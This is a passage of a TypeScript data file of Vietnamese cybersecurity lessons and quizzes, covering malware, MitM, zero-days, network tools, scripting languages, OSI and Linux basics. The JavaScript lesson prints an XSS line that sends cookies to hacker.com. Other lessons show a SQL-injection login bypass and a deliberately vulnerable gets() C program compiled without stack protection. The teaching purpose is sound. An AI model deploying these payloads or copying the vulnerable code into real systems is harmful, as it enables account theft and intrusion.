          explanation: "XSS = Cross-Site Scripting. Hacker chèn mã độc để đánh cắp cookie/thông tin."
        }
      },
      {
        id: "lesson-3-4",
        title: "Malware — 'các loại bệnh máy tính'",
        summary: "Virus, Trojan, Ransomware, Spyware — mỗi loại một cách phá hoại khác nhau.",
        analogy: "Giống các loại bệnh: Virus như cảm cúm (lây lan), Ransomware như bắt cóc (đòi tiền chuộc), Spyware như gián điệp (theo dõi bạn), Trojan như ngựa Trojan (giả quà tặng thực ra là quân địch).",
        content: `## 5 loại Malware chính

| Loại | Giống | Cách phá |
|---|---|---|
| **Virus** | Cảm cúm | Lây từ máy sang máy, phá hủy file |
| **Trojan** | Ngựa Trojan | Giả phần mềm tốt, thực ra mở cửa cho hacker |
| **Ransomware** | Bắt cóc | Khóa dữ liệu, đòi tiền chuộc |
| **Spyware** | Gián điệp | Theo dõi, ghi lại phím bấm |
| **Worm** | Sâu | Tự lây qua mạng, không cần file đính kèm |

### Ransomware — Nguy hiểm nhất hiện nay
- Mã hóa toàn bộ ổ cứng
- Hiện thông báo 'Nộp $500 trong Bitcoin trong 72h'
- Nổi tiếng: WannaCry (2017), LockBit

### 3 cách phòng Malware:
1. **Sao lưu (Backup)** — 3-2-1 rule: 3 bản sao, 2 phương tiện, 1 bản ở nơi khác
2. **Không mở file lạ** — .exe, .vbs, .docm từ email lạ
3. **Cập nhật phần mềm** — vá lỗ hổng bảo mật`,
        estMinutes: 8,
        order: 4,
        exercise: {
          type: "match",
          question: "Ghép loại Malware với đặc điểm:",
          items: [
            { id: "a", text: "Khóa file, đòi tiền chuộc" },
            { id: "b", text: "Giả phần mềm hữu ích nhưng thực ra là cửa sau" },
            { id: "c", text: "Theo dõi và ghi lại thông tin người dùng" },
          ],
          options: ["Virus", "Trojan", "Ransomware", "Spyware", "Worm"],
          correctAnswer: ["Ransomware", "Trojan", "Spyware"],
          explanation: "Ransomware tống tiền, Trojan giả mạo, Spyware theo dõi."
        }
      },
      {
        id: "lesson-3-5",
        title: "Man-in-the-Middle — 'nghe lén thư từ'",
        summary: "Kẻ xấu đứng giữa bạn và web, nghe/xem/sửa mọi thứ hai bên gửi cho nhau.",
        analogy: "Giống nhân viên bưu điện mở thư của bạn ra đọc, chụp lại, có khi sửa nội dung rồi dán lại gửi tiếp. Bạn tưởng thư vẫn nguyên vẹn, không biết đã bị xem.",
        content: `## Tấn công MitM

### Cách hoạt động:
1. Bạn tưởng đang vào Facebook
2. Thực ra đang vào máy hacker (giả Facebook)
3. Hacker chuyển tiếp request đến Facebook thật
4. Cả 2 bên tưởng đang nói chuyện trực tiếp, nhưng hacker nghe hết

### Tình huống thực tế:
- **WiFi giả** — Hacker mở WiFi 'Free Airport WiFi'. Bạn kết nối, mọi dữ liệu đều qua tay hacker
- **ARP Spoofing** — Hacker trong cùng mạng WiFi giả làm Router
- **DNS Spoofing** — Gõ vietcombank.com → Hacker trả về IP web giả

### Phòng tránh:
| Biện pháp | Hiệu quả |
|---|---|
| **HTTPS** | ✅ Web có ổ khóa xanh — chống được MitM cơ bản |
| **VPN** | ✅ Mã hóa toàn bộ đường truyền |
| **Không dùng WiFi lạ** | ✅ Nếu không có VPN |

### Nhận biết:
- Ổ khóa trình duyệt màu ĐỎ hoặc bị gạch → KHÔNG được nhập mật khẩu
- Trang web không có 'https://' ở đầu → không nhập thông tin`,
        estMinutes: 7,
        order: 5,
        exercise: {
          type: "multiple-choice",
          question: "Bạn đang ở quán cà phê, kết nối WiFi 'Free Coffee'. Cách nào bảo vệ bạn khỏi MitM?",
          options: [
            "A. Không nhập mật khẩu trang nào có ổ khóa xanh HTTPS",
            "B. Dùng VPN trước khi vào web",
            "C. Dùng chế độ ẩn danh (Incognito)",
            "D. Cả A và B",
          ],
          correctAnswer: "D",
          explanation: "HTTPS chống đọc trộm nội dung, VPN mã hóa toàn bộ đường truyền chống giả mạo."
        }
      },
      {
        id: "lesson-3-6",
        title: "Zero-day & Patch — 'lỗ hổng chưa ai biết'",
        summary: "Zero-day là lỗ hổng mà nhà sản xuất chưa biết, chưa có vá. Patch là 'miếng vá' bịt lỗ.",
        analogy: "Zero-day giống ổ khóa nhà bạn bị hỏng mà chưa ai phát hiện — kẻ trộm biết trước bạn. Patch là khi thợ khóa đến sửa. Sau khi sửa, kẻ trộm hết đường vào.",
        content: `## Vòng đời của một lỗ hổng

### Zero-day là gì?
- Nhà sản xuất chưa biết → chưa có bản vá
- Hacker phát hiện → có thể khai thác
- Không có cách phòng trừ (vì chưa biết lỗ ở đâu)

### Khi Zero-day được phát hiện:
1. **Đen**: Nếu hacker mũ đen phát hiện → khai thác ngay
2. **Trắng**: Nếu hacker mũ trắng phát hiện → báo cho nhà sản xuất
3. **Patch**: Nhà sản xuất ra bản vá (thường 1-30 ngày)
4. **Cập nhật**: Người dùng cập nhật → hết lỗ

### Tại sao phải cập nhật phần mềm NGAY?
- Khi bản vá ra, hacker cũng biết có lỗ
- Chạy đua: Ai cập nhật trước thì an toàn
- **Cập nhật = Vá lỗ trên thuyền**
- Không cập nhật = đi thuyền thủng

### Ví dụ nổi tiếng:
- **Heartbleed** (2014) — Lỗ trong OpenSSL, ảnh hưởng 500.000 web
- **Log4j** (2021) — Lỗ trong thư viện Java, ảnh hưởng hàng tỷ thiết bị
- Khi lộ, hacker khai thác ồ ạt — công ty nào không vá kịp thì toi`,
        estMinutes: 7,
        order: 6,
        exercise: {
          type: "true-false",
          question: "Đánh giá:",
          items: [
            { id: "a", text: "Zero-day là lỗ hổng đã có bản vá" },
            { id: "b", text: "Cập nhật phần mềm giúp vá lỗ hổng bảo mật" },
            { id: "c", text: "Hacker mũ trắng báo lỗi cho nhà sản xuất" },
          ],
          correctAnswer: ["false", "true", "true"],
          explanation: "Zero-day là lỗ CHƯA có vá. Cập nhật là vá lỗ. Hacker mũ trắng giúp vá lỗ."
        }
      },
    ],
  },
  {
    id: "module-4",
    title: "Thực hành Lab",
    description: "Môi trường mô phỏng an toàn (Click & Play).",
    goal: "Tự tay thực hiện phòng thủ cơ bản.",
    order: 4,
    lessons: [
      {
        id: "lesson-4-1",
        title: "Ping — 'gọi thử Internet'",
        summary: "Học cách dùng lệnh ping — như gọi điện thử xem Internet còn sống không.",
        analogy: "Ping giống như gọi to 'Alo, anh Google ơi!' và chờ xem có tiếng trả lời không. Nếu có 'Reply', là máy bên kia còn sống.",
        content: `## Ping — kiểm tra kết nối cơ bản nhất

Ping là lệnh đơn giản nhất trong bảo mật. Nó gửi một gói tin ICMP nhỏ và chờ phản hồi.

### Cú pháp:
\`\`\`bash
ping google.com
\`\`\`

### Kết quả trả về:
- **Reply from 142.250.1.1: bytes=32 time=14ms TTL=117** — OK, kết nối được
- **Request timed out** — Mất kết nối (hoặc tường lửa chặn)
- **TTL** — Thời gian sống, đếm số chặng (hop) gói tin đi qua

### Ứng dụng bảo mật:
- Kiểm tra máy chủ còn hoạt động không
- Đo độ trễ (latency) — thời gian phản hồi
- Phát hiện mất kết nối mạng`,
        estMinutes: 5,
        order: 1,
        exercise: {
          type: "multiple-choice",
          question: "Kết quả 'Reply from 142.250.1.1: time=14ms' có nghĩa là gì?",
          options: [
            "A. Máy tính bạn đã gửi được 14 gói tin",
            "B. Kết nối thành công, thời gian phản hồi 14ms",
            "C. Địa chỉ IP bị lỗi, cần thử lại 14 lần",
            "D. Có 14 thiết bị đang kết nối",
          ],
          correctAnswer: "B",
          explanation: "Reply from + IP = kết nối OK. time=14ms = thời gian phản hồi nhanh."
        }
      },
      {
        id: "lesson-4-2",
        title: "Nmap — 'quét cổng nhà'",
        summary: "Nmap quét các 'cửa ra vào' (port) của máy tính — cửa nào mở, cửa nào đóng.",
        analogy: "Giống như đi quanh một tòa nhà kiểm tra cửa nào khóa, cửa nào mở. Hacker dùng Nmap để tìm 'cửa mở' để đột nhập.",
        content: `## Nmap — Network Mapper

Nmap là công cụ #1 trong Cybersecurity. Nó cho biết:
- Port nào đang mở (cửa nào có thể vào)
- Dịch vụ gì đang chạy (có gì trong phòng đó)
- Hệ điều hành gì (Windows/Linux)

### Cú pháp cơ bản:
\`\`\`bash
nmap -sS 192.168.1.1
\`\`\`

### Port là gì?
Port là 'số cửa' để các chương trình giao tiếp:
- **Port 80** — HTTP (web không bảo mật)
- **Port 443** — HTTPS (web bảo mật)
- **Port 22** — SSH (điều khiển từ xa)
- **Port 3306** — MySQL (cơ sở dữ liệu)
- **Port 3389** — RDP (Remote Desktop Windows)

### Đọc kết quả Nmap:
- **OPEN** — Cửa mở, có thể khai thác
- **FILTERED** — Có tường lửa chặn
- **CLOSED** — Cửa đóng, không có dịch vụ`,
        estMinutes: 8,
        order: 2,
        exercise: {
          type: "fill-blank",
          question: "Port ___ dùng cho HTTPS. Port 22 dùng cho ___ (giao thức điều khiển từ xa). Port 3306 dùng cho cơ sở dữ liệu ___.",
          correctAnswer: ["443", "SSH", "MySQL"],
          explanation: "HTTPS = 443, SSH = 22, MySQL = 3306."
        }
      },
      {
        id: "lesson-4-3",
        title: "Wireshark — 'bắt sóng' mạng",
        summary: "Wireshark 'nghe' mọi gói tin đi qua máy bạn — học cách đọc gói tin như chuyên gia.",
        analogy: "Wireshark giống như máy bộ đàm của cảnh sát — bạn bắt được mọi cuộc gọi (gói tin) trong khu vực. Có thể nghe, phân tích, tìm kiếm bất thường.",
        content: `## Wireshark — 'Nghe lén' mạng hợp pháp

Wireshark bắt toàn bộ gói tin (packet) đi qua máy tính. Mỗi gói tin chứa:
- **IP nguồn → IP đích** (ai gửi → ai nhận)
- **Giao thức** (HTTP, TCP, DNS...)
- **Nội dung** (nếu không mã hóa)

### Lọc cơ bản:
- \`http\` — Chỉ xem gói HTTP
- \`ip.addr == 192.168.1.1\` — Chỉ xem IP cụ thể
- \`tcp.port == 443\` — Chỉ xem port 443
- \`dns\` — Chỉ xem truy vấn DNS

### Tại sao quan trọng?
- Phát hiện kết nối lạ (malware đang 'gọi về nhà')
- Kiểm tra ứng dụng có gửi dữ liệu không mã hóa không
- Debug lỗi mạng

### Lưu ý:
- Chỉ bắt được gói tin trên mạng bạn có quyền
- Dùng để HỌC, không dùng để hack
- Cần quyền admin để chạy`,
        estMinutes: 8,
        order: 3,
        exercise: {
          type: "true-false",
          question: "Đánh giá:",
          items: [
            { id: "a", text: "Wireshark có thể xem nội dung gói tin HTTP không mã hóa" },
            { id: "b", text: "Bộ lọc 'dns' chỉ hiện gói tin DNS" },
            { id: "c", text: "Wireshark tự động phát hiện virus" },
          ],
          correctAnswer: ["true", "true", "false"],
          explanation: "HTTP không mã hóa nên Wireshark đọc được. Lọc DNS chỉ hiện DNS. Wireshark không phải antivirus."
        }
      },
      {
        id: "lesson-4-4",
        title: "Tổng kết — 'tự tin bảo vệ bản thân'",
        summary: "Ôn tập toàn bộ kiến thức và lập kế hoạch học tiếp theo.",
        analogy: "Bạn đã đi từ 'không biết gì' đến 'hiểu cách hacker nghĩ'. Giống như học võ — đã biết cách phòng thủ cơ bản, giờ cần luyện tập thường xuyên.",
        content: `## 🎉 Chúc mừng bạn đã hoàn thành khóa học!

### Những gì bạn đã học được:
| Giai đoạn | Bạn có thể |
|---|---|
| 1. Xóa mù CNTT | Hiểu máy tính, Internet, IP, DNS, giao thức |
| 2. Căn bản bảo mật | Đặt mật khẩu mạnh, nhận diện Phishing, bật 2FA |
| 3. Hacker tư duy | Hiểu Social Engineering, SQLi, XSS, Malware, MitM |
| 4. Thực hành | Ping, Nmap, Wireshark, phòng thủ cơ bản |

### 5 điều làm NGAY hôm nay:
1. ✅ Bật 2FA cho email và Facebook
2. ✅ Đổi mật khẩu yếu thành câu dài khó đoán
3. ✅ Cập nhật Windows/macOS/Điện thoại
4. ✅ Dùng VPN trên WiFi công cộng
5. ✅ Backup dữ liệu quan trọng

### Lộ trình học tiếp:
Nếu muốn đi sâu, hãy tìm hiểu:
- **CompTIA Security+** — Chứng chỉ bảo mật căn bản
- **TryHackMe** — Lab thực hành free
- **HackTheBox** — Thử thách hack hợp pháp`,
        estMinutes: 5,
        order: 4,
        exercise: {
          type: "multiple-choice",
          question: "Hành động nào QUAN TRỌNG NHẤT bạn nên làm NGAY sau khóa học này?",
          options: [
            "A. Mua VPN trả phí",
            "B. Bật 2FA cho email và cập nhật phần mềm",
            "C. Học thêm khóa khác ngay lập tức",
            "D. Mua máy tính mới",
          ],
          correctAnswer: "B",
          explanation: "2FA và cập nhật là 2 việc miễn phí, hiệu quả NHẤT. Làm ngay trước khi quên!"
        }
      },
    ],
  },
];

export const advancedModules: Module[] = [
  {
    id: "adv-module-1",
    title: "Lập trình nền tảng",
    description: "Python, JavaScript, SQL — 3 ngôn ngữ nền tảng cho Cybersecurity.",
    goal: "Đọc và viết được script cơ bản phục vụ bảo mật.",
    order: 1,
    lessons: [
      {
        id: "adv-lesson-1-1",
        title: "Python — 'con dao Thụy Sĩ' của Security",
        summary: "Python là ngôn ngữ #1 trong Cybersecurity — viết script quét mạng, phân tích log, brute force.",
        analogy: "Python giống con dao đa năng của lính cứu hỏa — một công cụ làm được trăm thứ.",
        content: `## Python cho Security

Python được dùng trong hầu hết tool bảo mật hiện đại.

### Cài đặt:
- **Linux/macOS**: Đã có sẵn. Gõ \`python3 --version\`
- **Windows**: Tải từ python.org

### Ví dụ script quét port đơn giản:
\`\`\`python
import socket

def scan_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0

target = "192.168.1.1"
for port in [22, 80, 443, 3306]:
    if scan_port(target, port):
        print(f"Port {port} OPEN")
\`\`\`

### 3 thư viện Security PHẢI BIẾT:
| Thư viện | Dùng để |
|---|---|
| \`socket\` | Quét port, kết nối mạng |
| \`requests\` | Gửi HTTP request, kiểm tra web |
| \`scapy\` | Bắt/gửi gói tin mạng (như Scapy) |

### Bài tập:
Sửa script trên để quét range port 1-1000.`,
        estMinutes: 10,
        order: 1,
        exercise: {
          type: "fill-blank",
          question: "Python dùng thư viện _____ để quét port và _____ để gửi HTTP request. Thư viện _____ dùng để bắt gói tin mạng.",
          correctAnswer: ["socket", "requests", "scapy"],
          explanation: "socket cho kết nối mạng, requests cho HTTP, scapy cho packet manipulation."
        }
      },
      {
        id: "adv-lesson-1-2",
        title: "JavaScript — 'mắt xích' Web Security",
        summary: "Hiểu JS để phân biệt mã độc XSS, đọc source web, kiểm tra bảo mật frontend.",
        analogy: "JavaScript là 'ngôn ngữ của trình duyệt' — hiểu nó giống như biết đọc bản đồ khi đi vào thành phố Web.",
        content: `## JavaScript trong Bảo mật Web

JavaScript chạy trong trình duyệt — nơi diễn ra hầu hết tấn công web.

### 3 kỹ năng JS cần biết:

**1. Đọc mã độc XSS:**
\`\`\`javascript
// Mã độc — đánh cắp cookie
document.location='https://hacker.com/steal?c='+document.cookie
\`\`\`
→ Biết nhận dạng để báo cáo

**2. Debug Console:**
- F12 → Console để xem lỗi
- F12 → Network để xem request
- F12 → Sources để đọc JS thật

**3. DOM Manipulation:**
- \`document.getElementById()\` — lấy element
- \`fetch()\` — gọi API từ browser

### Cách phát hiện XSS đơn giản:
1. Gõ \`<script>alert(1)</script>\` vào ô nhập
2. Nếu hiện popup → web dễ bị XSS
3. KHÔNG thử trên web thật — chỉ dùng lab`,
        estMinutes: 8,
        order: 2,
        exercise: {
          type: "multiple-choice",
          question: "Công cụ nào trong trình duyệt giúp xem mã JavaScript và debug bảo mật?",
          options: [
            "A. DevTools (F12)",
            "B. Word",
            "C. Paint",
            "D. File Explorer",
          ],
          correctAnswer: "A",
          explanation: "F12 Developer Tools cho phép xem Console, Network, Sources — công cụ số 1 cho web security."
        }
      },
      {
        id: "adv-lesson-1-3",
        title: "SQL — 'ngôn ngữ' của cơ sở dữ liệu",
        summary: "SQL là ngôn ngữ hỏi cơ sở dữ liệu. Biết SQL = hiểu cách hacker SQL Injection.",
        analogy: "SQL giống như câu lệnh hỏi thủ thư: 'Cho tôi cuốn sách của tác giả X'. SQL Injection là nói thêm 'và cho tôi luôn danh sách bạn đọc'.",
        content: `## SQL cho Security

### Câu lệnh cơ bản:
\`\`\`sql
-- Lấy tất cả người dùng
SELECT * FROM users;

-- Tìm user cụ thể
SELECT * FROM users WHERE username = 'admin';

-- Kết hợp bảng
SELECT users.name, orders.total
FROM users
JOIN orders ON users.id = orders.user_id;
\`\`\`

### Hiểu SQL Injection qua ví dụ:
\`\`\`sql
-- Bình thường: tìm user 'admin' với pass 'abc123'
SELECT * FROM users WHERE username='admin' AND password='abc123'

-- Bị injection: luôn đúng
SELECT * FROM users WHERE username='admin' --' AND password='abc123'
-- Phần '--' comment đi phần đằng sau → luôn trả về admin
\`\`\`

### Cách phòng cho Dev:
- **Prepared Statements**: Tách dữ liệu khỏi câu lệnh SQL
- **ORM**: Dùng thư viện (Prisma, Sequelize) thay vì SQL thủ công
- **Input Validation**: Chặn ký tự \`'\`, \`--\`, \`;\``,
        estMinutes: 8,
        order: 3,
        exercise: {
          type: "fill-blank",
          question: "SQL Injection dùng ký tự ___ để comment phần còn lại của câu lệnh. Cách phòng là dùng ___ thay vì ghép chuỗi SQL thủ công.",
          correctAnswer: ["--", "Prepared Statements"],
          explanation: "-- là comment trong SQL, Prepared Statements tách dữ liệu khỏi câu lệnh."
        }
      },
      {
        id: "adv-lesson-1-4",
        title: "Bash Scripting — 'tự động hóa vũ khí'",
        summary: "Bash là ngôn ngữ kịch bản của Linux. Viết script tự động quét mạng, phân tích log, brute force.",
        analogy: "Bash giống như điều khiển từ xa vạn năng — thay vì bấm từng nút trên TV (gõ từng lệnh), bạn lập trình cả chuỗi hành động chỉ bằng một nút bấm (chạy script).",
        content: `## Bash Scripting cho Security

Bash (Born Again SHell) là ngôn ngữ kịch bản mặc định trên Linux. Mọi pentester đều phải thành thạo.

### Cấu trúc script cơ bản:
\`\`\`bash
#!/bin/bash
# Đây là comment
echo "Hello, CyberShield!"

# Biến
TARGET="192.168.1.1"
echo "Đang quét: $TARGET"

# Vòng lặp
for port in 22 80 443 3306; do
    echo "Kiểm tra port $port..."
done
\`\`\`

### Script tự động quét subnet:
\`\`\`bash
#!/bin/bash
# Script: scan_subnet.sh
# Cách dùng: ./scan_subnet.sh 192.168.1

SUBNET=$1
echo "[*] Scanning subnet $SUBNET.0/24 ..."

for ip in $(seq 1 254); do
    ping -c 1 -W 1 "$SUBNET.$ip" &>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] $SUBNET.$ip is ALIVE"
    fi
done
\`\`\`

### Script phân tích log brute-force:
\`\`\`bash
#!/bin/bash
# Phân tích /var/log/auth.log tìm brute-force SSH

LOG="/var/log/auth.log"
echo "[*] Phân tích log SSH brute-force..."
grep "Failed password" "$LOG" | awk '{print $11}' | sort | uniq -c | sort -nr | head -10
\`\`\`

### 3 kỹ thuật Bash security PHẢI biết:
| Kỹ thuật | Lệnh | Mục đích |
|---|---|---|
| Lọc log | \`grep, awk, sed\` | Tìm dấu hiệu tấn công |
| Tự động hóa | \`cron, at\` | Chạy script định kỳ |
| Parsing | \`cut, tr, sort, uniq\` | Xử lý dữ liệu dạng cột |

### Thực hành trên Terminal:
\`\`\`bash
# 1. Tạo script đầu tiên
echo '#!/bin/bash' > myscript.sh
echo 'echo "Xin chao CyberShield!"' >> myscript.sh
chmod +x myscript.sh
./myscript.sh

# 2. Kiểm tra IP của bạn
curl -s ifconfig.me

# 3. Đếm số dòng trong file log
wc -l /var/log/syslog
\`\`\``,
        estMinutes: 10,
        order: 4,
        exercise: {
          type: "multiple-choice",
          question: "Bạn muốn tìm tất cả địa chỉ IP đã brute-force SSH từ file auth.log. Dùng lệnh nào?",
          options: [
            "A. grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr",
            "B. cat /var/log/auth.log | head -100",
            "C. ls -la /var/log/",
            "D. ping google.com",
          ],
          correctAnswer: "A",
          explanation: "Câu A: grep lọc dòng 'Failed password', awk lấy cột IP thứ 11, sort|uniq đếm số lần, sort -nr sắp xếp từ cao đến thấp."
        }
      },
      {
        id: "adv-lesson-1-5",
        title: "C/C++ — 'hiểu sâu bộ nhớ và khai thác'",
        summary: "C là ngôn ngữ gần với hệ điều hành nhất. Hiểu C = hiểu buffer overflow, ROP, và reverse engineering.",
        analogy: "C/C++ giống như bản thiết kế chi tiết của một tòa nhà (cấp phát bộ nhớ, con trỏ, địa chỉ). Python là người dùng chỉ cần biết công tắc đèn ở đâu. Hacker giỏi phải đọc được bản thiết kế.",
        content: `## C/C++ cho Binary Exploitation

Hầu hết lỗ hổng bảo mật nghiêm trọng đều đến từ C/C++ — buffer overflow, use-after-free, heap overflow.

### Con trỏ (Pointer) — trái tim của C:
\`\`\`c
#include <stdio.h>

int main() {
    int secret = 1337;          // Biến trên stack
    int *ptr = &secret;         // Con trỏ trỏ đến địa chỉ của secret
    
    printf("Gia tri: %d\\n", secret);   // 1337
    printf("Dia chi: %p\\n", ptr);      // 0x7fff...
    printf("Gia tri qua ptr: %d\\n", *ptr); // 1337
    
    return 0;
}
\`\`\`

### Buffer Overflow — lỗ hổng kinh điển:
\`\`\`c
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buffer[16];            // Chỉ 16 bytes
    printf("Nhap du lieu: ");
    gets(buffer);               // KHÔNG GIỚI HẠN độ dài!
    printf("Ban da nhap: %s\\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
\`\`\`

Nếu nhập hơn 16 ký tự, dữ liệu tràn vào vùng nhớ kế bên — hacker có thể ghi đè địa chỉ trả về (return address).

### Stack Memory Layout:
\`\`\`
Địa chỉ cao
+------------------+
| Return Address   |  ← Hacker muốn ghi đè vào đây
+------------------+
| Saved EBP        |
+------------------+
| buffer[0..15]    |  ← Nhập dữ liệu từ đây
+------------------+
Địa chỉ thấp
\`\`\`

### Các lỗ hổng C/C++ phổ biến:
| Lỗ hổng | Nguyên nhân | Hậu quả |
|---|---|---|
| Buffer Overflow | Không kiểm tra độ dài input | RCE (Remote Code Execution) |
| Use-After-Free | Dùng con trỏ sau khi free | Tấn công heap |
| Integer Overflow | Số vượt quá giới hạn | Logic lỗi, bypass kiểm tra |
| Format String | Dùng printf(user_input) | Rò rỉ bộ nhớ, ghi đè |

### Thực hành an toàn:
\`\`\`bash
# Biên dịch chương trình C
gcc -o vuln vuln.c -fno-stack-protector -z execstack

# Kiểm tra các cơ chế bảo vệ
checksec --file=vuln

# Debug với GDB
gdb ./vuln
(gdb) disassemble main
\`\`\``,
        estMinutes: 12,
        order: 5,
        exercise: {
          type: "fill-blank",
          question: "Lỗ hổng _____ xảy ra khi nhập dữ liệu vượt quá kích thước vùng đệm. Hàm _____ trong C là nguy hiểm nhất vì không kiểm tra độ dài. Công cụ _____ dùng để debug binary.",
          correctAnswer: ["buffer overflow", "gets", "GDB"],
          explanation: "Buffer overflow = tràn bộ đệm. gets() không giới hạn input. GDB = GNU Debugger."
        }
      },
    ],
  },
  {
    id: "adv-module-2",
    title: "Mạng máy tính chuyên sâu",
    description: "OSI Model, TCP/IP chi tiết, Routing, Subnetting, Giao thức bảo mật.",
    goal: "Hiểu sâu cách gói tin di chuyển và bảo vệ từng lớp.",
    order: 2,
    lessons: [
      {
        id: "adv-lesson-2-1",
        title: "OSI Model — '7 tầng' của mạng",
        summary: "Mô hình OSI chia việc truyền dữ liệu thành 7 tầng, từ dây điện đến ứng dụng.",
        analogy: "Giống như gửi hàng: Tầng 7 (bạn gói quà) → Tầng 6 (dịch hóa đơn) → ... → Tầng 1 (xe tải chạy trên đường). Mỗi tầng chỉ lo việc của mình.",
        content: `## 7 Tầng OSI

### Từ trên xuống dưới:
| Tầng | Tên | Ví dụ | Bảo mật |
|---|---|---|---|
| 7 | Application | HTTP, DNS, FTP | Mã hóa ứng dụng |
| 6 | Presentation | SSL/TLS, JPEG | Mã hóa dữ liệu |
| 5 | Session | Sockets, NetBIOS | Quản lý phiên |
| 4 | Transport | TCP, UDP | Firewall port |
| 3 | Network | IP, ICMP | Network ACL |
| 2 | Data Link | Ethernet, MAC | MAC filtering |
| 1 | Physical | Cáp, WiFi, Hub | Physical security |

### Ghi nhớ: "Please Do Not Throw Sausage Pizza Away"
- **P**hysical (1)
- **D**ata Link (2)
- **N**etwork (3)
- **T**ransport (4)
- **S**ession (5)
- **P**resentation (6)
- **A**pplication (7)

### Mẹo bảo mật cho từng tầng:
- **Tầng 3 (IP)**: Chặn IP lạ bằng firewall
- **Tầng 4 (TCP)**: Chỉ mở port cần thiết
- **Tầng 6 (Presentation)**: Luôn dùng TLS
- **Tầng 7 (HTTP)**: Validate input — chống SQLi, XSS`,
        estMinutes: 10,
        order: 1,
        exercise: {
          type: "true-false",
          question: "Đánh giá đúng/sai về OSI Model:",
          items: [
            { id: "a", text: "Tầng Transport (4) quản lý giao thức TCP/UDP" },
            { id: "b", text: "Firewall hoạt động ở tầng Physical (1)" },
            { id: "c", text: "HTTPS mã hóa ở tầng Presentation (6)" },
          ],
          correctAnswer: ["true", "false", "true"],
          explanation: "Tầng 4 = TCP/UDP. Firewall tầng 3-4. TLS mã hóa ở tầng 6."
        }
      },
      {
        id: "adv-lesson-2-2",
        title: "Subnetting — 'chia lô' mạng",
        summary: "Chia mạng lớn thành mạng nhỏ để quản lý và bảo mật tốt hơn.",
        analogy: "Subnet giống chia tòa chung cư thành các khu: tầng 1-5 (nhân viên), tầng 6-10 (quản lý), tầng 11 (server) — mỗi khu có cửa riêng.",
        content: `## Subnetting và CIDR

### Tại sao cần chia subnet?
- **Bảo mật**: Tách biệt các phòng ban
- **Hiệu suất**: Giảm broadcast domain
- **Quản lý**: Dễ theo dõi, kiểm soát

### Ký hiệu CIDR:
\`\`\`
192.168.1.0/24
├── 192.168.1.0   → Network ID (địa chỉ mạng)
├── 192.168.1.1   → Gateway (Router)
├── 192.168.1.2-254 → Host (máy tính)
└── 192.168.1.255 → Broadcast (gửi cho tất cả)
\`\`\`

### /24, /16, /8 là gì?
| CIDR | Số IP | Dùng cho |
|---|---|---|
| /32 | 1 IP | Một máy cụ thể |
| /24 | 254 IP | Mạng văn phòng nhỏ |
| /16 | 65,534 IP | Trường học, công ty lớn |
| /8 | 16 triệu IP | ISP, tổ chức toàn cầu |

### Bảo mật với Subnet:
- Server, DB, User nên ở 3 subnet riêng
- Firewall rule: User → Server (port 80/443), Server → DB (port 3306)
- **Không** để user truy cập thẳng DB`,
        estMinutes: 10,
        order: 2,
        exercise: {
          type: "multiple-choice",
          question: "Subnet 192.168.1.0/24 có thể chứa tối đa bao nhiêu máy tính?",
          options: [
            "A. 24 máy",
            "B. 254 máy",
            "C. 256 máy",
            "D. 16 triệu máy",
          ],
          correctAnswer: "B",
          explanation: "/24 = 256 IP - 2 (network + broadcast) = 254 host."
        }
      },
      {
        id: "adv-lesson-2-3",
        title: "Giao thức bảo mật — TLS, SSH, IPsec",
        summary: "3 giao thức bảo mật chính: TLS cho web, SSH cho remote, IPsec cho VPN.",
        analogy: "TLS = Thư mật (bảo vệ web), SSH = Đường hầm (điều khiển xa), IPsec = Bưu kiện niêm phong (VPN).",
        content: `## Giao thức bảo mật

### TLS (Transport Layer Security)
- Bảo vệ HTTP → HTTPS
- **Handshake**: Client gửi 'chào', Server gửi chứng chỉ, xác thực, tạo khóa chung
- Port: 443

### SSH (Secure Shell)
- Điều khiển máy tính từ xa an toàn
- **Cách dùng**: \`ssh user@192.168.1.1 -p 22\`
- **Key-based auth**: An toàn hơn password

### IPsec (IP Security)
- Mã hóa ở tầng IP
- Dùng trong VPN site-to-site
- 2 mode: Transport (chỉ mã hóa data) và Tunnel (mã hóa cả header)

### So sánh nhanh:
| Giao thức | Tầng OSI | Port | Dùng cho |
|---|---|---|---|
| TLS | 6 (Presentation) | 443 | HTTPS, Email |
| SSH | 7 (Application) | 22 | Remote server |
| IPsec | 3 (Network) | - | VPN doanh nghiệp |`,
        estMinutes: 8,
        order: 3,
        exercise: {
          type: "match",
          question: "Ghép giao thức với đúng port:",
          items: [
            { id: "a", text: "HTTPS (TLS)" },
            { id: "b", text: "SSH" },
            { id: "c", text: "HTTP" },
          ],
          options: ["22", "80", "443", "3306"],
          correctAnswer: ["443", "22", "80"],
          explanation: "HTTPS = 443, SSH = 22, HTTP = 80."
        }
      },
    ],
  },
  {
    id: "adv-module-3",
    title: "Linux làm chủ",
    description: "Terminal, File System, Permission, Shell Script, Network tools trên Linux.",
    goal: "Tự tin dùng terminal Linux như một pentester thực thụ.",
    order: 3,
    lessons: [
      {
        id: "adv-lesson-3-1",
        title: "Terminal & File System Linux",
        summary: "Khác Windows: trong Linux, mọi thứ là file. Học cấu trúc thư mục và lệnh cơ bản.",
        analogy: "Windows giống văn phòng có bàn giấy (Desktop, My Documents, C:). Linux giống nhà kho — mỗi khu vực có chức năng riêng: /bin là thùng đồ nghề, /etc là tủ hồ sơ.",
        content: `## Linux File System

### Cấu trúc thư mục:
| Thư mục | Chức năng |
|---|---|
| / | Root — gốc của mọi thứ |
| /bin | Lệnh cơ bản (ls, cat, cp) |
| /etc | Cấu hình hệ thống |
| /var | Log, dữ liệu biến đổi |
| /home | Thư mục người dùng |
| /root | Thư mục của root |
| /tmp | File tạm — xóa khi reboot |

### Lệnh cơ bản PHẢI thuộc:
- \`pwd\` — đang ở đâu
- \`ls -la\` — xem file, kể cả file ẩn
- \`cd /path\` — di chuyển
- \`cat file.txt\` — đọc file
- \`mkdir, touch, cp, mv, rm\` — tạo, copy, di chuyển, xóa

### File ẩn:
- File bắt đầu bằng dấu chấm → \`.bashrc\`, \`.ssh/\`
- \`ls -a\` để hiển thị

### Mẹo:
- Dùng \`tab\` để tự động hoàn thành lệnh
- \`↑ ↓\` để xem lịch sử lệnh
